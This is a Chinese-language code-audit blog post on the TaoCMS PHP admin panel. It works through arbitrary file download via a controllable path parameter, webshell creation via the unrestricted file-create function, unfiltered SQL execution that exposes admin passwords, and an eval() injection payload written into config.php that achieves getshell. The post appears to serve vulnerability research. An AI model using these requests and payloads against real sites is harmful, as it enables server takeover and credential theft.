<span class="token comment">//如果有$action，就进行实例化便于后续调用</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">catauth</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$ctrl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token variable">$model</span><span class="token operator">-></span><span class="token variable">$ctrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<hr>
<h1 id="Model"><a href="#Model" class="headerlink" title="Model&#x2F;"></a>Model&#x2F;</h1><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>前面在文件上传的部分提到过它，但没有来得及更新文档一，文档一就离我而去了。</p>
<br>

<p>根据前面的分析:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E5%88%86%E6%9E%90.png" class title="分析">

<table><tr><td bgcolor="yellow"> <b>action</b> 传入需要实例化的类名， <b>ctrl</b> 传入需要调用的方法。</td></tr></table>

<p>根据file.php提供的线索可以知道，它提供功能给 <strong>文件管理</strong> ,点击已存在的文件：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">//api.php
<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin/admin.php?action=file&amp;ctrl=edit&amp;path=api.php</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<br>
<br>

<p>随便新建文件 <code>fly.php</code>，抓包后得到： </p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin/admin.php?path=&amp;action=file&amp;ctrl=create&amp;isdir=0&amp;name=fly.php&amp;fbtn=%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">taocms</span></span>

//找了一下，fbtn出现在managerfile.php中，作为input name 和 id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>由上面两个例子可以看到，就如我们所说，path可控所以</p>
<p>修改path再调用存在问题的<code>function download()</code>：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">
<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin/admin.php?path=/rss.php&amp;action=file&amp;ctrl=download</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">taocms</span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>得到</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/download.png" class title="download">

<p>做到了<table><tr><td bgcolor="yellow">任意文件下载。</td></tr></table></p>
<hr>
<hr>
<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="upload？"><a href="#upload？" class="headerlink" title="upload？"></a>upload？</h3><p>在管理界面到处找找，于是找到<strong>上传</strong>这个东西，打开:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E4%B8%8A%E4%BC%A0%E7%95%8C%E9%9D%A2.png" class title="上传">


<p>用php文件测试一下</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95.png" class title="上传">


<p>as you can see:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//upload.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$inputname</span><span class="token punctuation">,</span><span class="token variable">$attachdir</span><span class="token operator">=</span><span class="token string single-quoted-string">'pictures/'</span><span class="token punctuation">,</span><span class="token variable">$urldir</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$dirtype</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$maxattachsize</span><span class="token operator">=</span><span class="token number">10097152</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token variable">$upext</span><span class="token operator">=</span><span class="token string single-quoted-string">'txt,rar,zip,jpg,jpeg,gif,png,swf,wmv,avi,wma,mp3,mid,jar,jad,exe,html,htm,css,js,doc'</span><span class="token punctuation">;</span><span class="token comment">//上传扩展名</span>
		<span class="token variable">$err</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
		<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
		<span class="token variable">$upfile</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$inputname</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$fileinfo</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过pathinfo()获取文件扩展名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>白名单很难绕过</p>
<p>而<code>pathinfo()</code></p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">name = example.png
Array
(
    [dirname] => .
    [basename] => example.jpg
    [extension] => jpg
    [filename] => example
)

name = test.php.png
Array
(
    [dirname] => .
    [basename] => test.php.png
    [extension] => png
    [filename] => test.php
)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或许文件包含？不过在那之前先看另一个界面， <strong>新建文件&#x2F;文件夹</strong></p>
<h3 id="create？"><a href="#create？" class="headerlink" title="create？"></a>create？</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//File.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请填写文件名/文件夹名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">realpath</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isdir'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'目录'</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
			<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'文件'</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'新建'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$info</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'新建'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'成功'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'admin.php?action=file&amp;ctrl=lists&amp;path='</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大致看一遍会发现，对于建立的文件没有任何限制，所以就新建 <code>ice.php</code>然后写入：</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/ice.png" class title="新建文件">

<p>然后用菜刀之类的工具，URL填的就是<code><a href="http://taocms/ice.php">http://taocms/ice.php</a></code>,密码填 cmd ，ok，连上。<br>如果直接访问<code><a href="http://taocms/ice.php">http://taocms/ice.php</a></code>其实什么也看不到，稍微修改一下<code>ice.php</code>里面写入的内容就可以实现其他的操作了。<br><br></p>
<p>有趣的是，由于这个cms里面管理员后台可以对所有文件进行查看和编辑，所以前面那个对于文件上传的白名单完全可以被修改，也不用费力气去找其他突破点。LOL。<br><br></p>
<hr>
<hr>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>有一个执行SQL，所以去看看</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//sql.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">excute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$creatTable</span><span class="token operator">=</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">magic2word</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sqltext'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//传入的SQL语句作为sqltext的值&lt;</span>
		<span class="token variable">$db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Dbclass</span><span class="token punctuation">(</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token constant">DB_NAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建新db类</span>
		<span class="token variable">$o</span><span class="token operator">=</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$creatTable</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用query执行传入的SQL语句&lt;</span>
		<span class="token keyword">echo</span><span class="token string single-quoted-string">'&lt;pre>'</span><span class="token punctuation">;</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">execmsg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'执行SQL'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'?action=sql&amp;ctrl=display'</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//execmsg()只负责报信</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一样的，对所执行的SQL语句没有什么限制。</p>
<h4 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h4><ul>
<li>1.<code>show tables;</code><img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/showtables.png" class title="SQL1"></li>
</ul>
<p>可以得知：<br>1.database name &#x3D; <code>taocms</code><br>2.表名是<code>cms_admin</code></p>
<ul>
<li>2.<code>select * from cms_admin;</code><img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/showcolumns.png" class title="SQL2">
这里有趣的是，在 用户修改 这个模块里看不到的管理员密码就这么找到了。要说有什么用，目前我也没看出来。<p></p><hr></li>
</ul>
<p>有个添加用户的，也许会有越权？</p>
<hr>
<hr>

<h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><p>如果搞过一点类似cms或者blog的搭建，都会知道config这个名字意味着这个文档是关于整个system的配置。</p>
<p>as you can see:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F.png" class title="管理系统">

<p>对于config一类文档，考虑的问题在于：</p>
<ul>
<li><table><tr><td bgcolor="yellow">是否可以写入</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">是否可以访问</td></tr></table></li>
</ul>
<hr>
<h2 id="update"><a href="#update" class="headerlink" title="update()"></a>update()</h2><p>查看<code>config.php</code><br>里面有三个function，第三个看起来就是毫无利用价值的，第一个太复杂，先说第二个<code>update()</code>。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">function update()&#123;
        //这行代码检查`config.php`文件是否可写。如果不可写，它将显示一条消息，指出没有修改配置文件的权限。
		is_writable(SYS_ROOT.'config.php')||Base::showmessage('无权限修改配置文件');

        //这行代码从`$_POST`数组中移除`Submit`、`ctrl`和`action`键，这可能是为了确保这些键不会被写入配置文件。
		unset($_POST['Submit']);unset($_POST['ctrl']);unset($_POST['action']);
        
        //接下来的几行代码创建一个新的配置文件内容。它遍历`$_POST`数组中的每个键值对，并为每个键创建一个定义语句。这些定义语句将被写入配置文件。$key是键。$configs是键值，然后用Base::safeword对$config进行安全检查
		$configData="<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\r\n<span class="token string double-quoted-string">";
		foreach(<span class="token interpolation"><span class="token variable">$_POST</span></span> as <span class="token interpolation"><span class="token variable">$key</span></span>=><span class="token interpolation"><span class="token variable">$configs</span></span>)&#123;
			<span class="token interpolation"><span class="token variable">$configData</span></span>.="</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'".$key."'</span><span class="token punctuation">,</span>	<span class="token string single-quoted-string">'".Base::safeword($configs)."'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\r\n<span class="token string double-quoted-string">";
		&#125;
		<span class="token interpolation"><span class="token variable">$configData</span></span>.="</span><span class="token delimiter important">?></span></span>";

        //将新的配置文件内容写入`config.php`文件。
		$status=file_put_contents(SYS_ROOT."config.php",$configData);
		Base::execmsg("保存设置","?action=".$this->table.'&amp;ctrl=display',TRUE);
	&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<br>

<p>不用特别仔细看就可以从<code>unset()</code>这里知道参数以 <strong>POST</strong> 方法传入。以及这个文件可以写入，不过是有条件的写入。以及得到了传入的$_POST的值的$configs自带<code>&lt;?php</code> 和 <code>?&gt;</code>，指明构造PHP version的payload。<br><br></p>
<p>由第三个注释知道，重点在于<code>foreach()</code>中，然后就是<code>Base::safeword()</code>如何进行检查？</p>
<hr>
<h2 id="safeword"><a href="#safeword" class="headerlink" title="safeword()"></a>safeword()</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//Base.php</span>

	<span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">safeword</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token variable">$level</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token comment">//是否为数组</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token comment">//键为$key，键值为$value</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$text</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//结果存入$safeword，这也是一个数组。</span>
				<span class="token variable">$safeword</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">safeword</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
        <span class="token comment">//不是数组进行switch</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#123;</span>
				<span class="token comment">//不进行处理</span>
                <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token variable">$text</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//转整数</span>
				<span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//移除所有HTML标签</span>
				<span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//将特殊字符转化为HTML实体，并将换行符转换为&lt;br/>标签</span>
				<span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//添加'来转义$text中出现的单引号，移除关键词与符号select, union,=，避免SQL Injection</span>
				<span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$safeword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"union"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$safeword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$safeword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token keyword">default</span><span class="token punctuation">:</span><span class="token comment">//默认level=8时为default</span>

                    <span class="token comment">//如果数据库类型是Sqlite，将$text中出现的单引号都替换为两个单引号。</span>
					<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token constant">DB</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'Sqlite'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
						<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"''"</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
                    <span class="token comment">//不是Sqlite，就用_addslashs()来处理$text.该函数静态调用addslashs()函数处理$text</span>
					<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
						<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">_addslashs</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
			
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> <span class="token variable">$safeword</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><p><code>addslashes()</code>函数：在PHP中，<code>addslashes()</code>函数的主要作用是在预定义字符前添加反斜线。预定义字符包括单引号(‘)，双引号(“)，反斜线()和NULL。</p>
</li>
<li><p>将特殊字符转化为HTML实体，并将换行符转换为<code>&lt;br/&gt;</code>标签：在PHP中，可以使用<code>htmlentities()</code>函数将字符转换为HTML实体。这样做的目的是防止跨站脚本攻击（XSS），并确保文本在HTML文档中正确显示。例如，如果你的文本中包含<code>&lt;</code>或<code>&gt;</code>等字符，它们可能会被浏览器误解为HTML标签。通过将这些字符转换为HTML实体，你可以确保它们会被正确地显示为文本，而不是被解析为HTML代码。同样，<code>nl2br()</code>函数可以将字符串中的换行符转换为HTML的<code>&lt;br/&gt;</code>标签，这样在HTML文档中就可以正确地显示换行了。</p>
</li>
<li><p>将单引号替换为两个单引号：在SQLite中，单引号是字符串的界定符。如果字符串中包含单引号，SQLite可能会将其误解为字符串的结束，从而导致错误。为了避免这种情况，将字符串中的单引号替换为两个单引号。这样，SQLite就会知道这是一个字面上的单引号，而不是字符串的结束。</p>
</li>
</ol>
<br>
<br>

<p>在了解完这些代码在说什么之后，发现除了level 8这个default，其他都有较为严苛的限制。而在default中，有一个if else的限制，<code>Base::_addslashs()</code>不能绕过，就focus on <strong>Sqlite</strong>。</p>
<h2 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h2><p>构造payload：<br><code><code>\</code>';@eval($_REQUEST[1];/*</code></p>
<p>$safeword之后</p>
<p><code>\&#39;&#39;;@eval($_REQUEST[1];/*</code></p>
<p>与<code>congig.php</code>中WEBINFO define的<code>&#39;</code>进行闭合，让PHP代码逃逸进而成功写入。</p>
<p>然后访问<code>http://taocms/config.php?1=phpinfo();</code><br>getshell成功。</p>
<p>最后的<code>/*</code>也可以写成<code>//</code></p>
<hr>
<hr>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
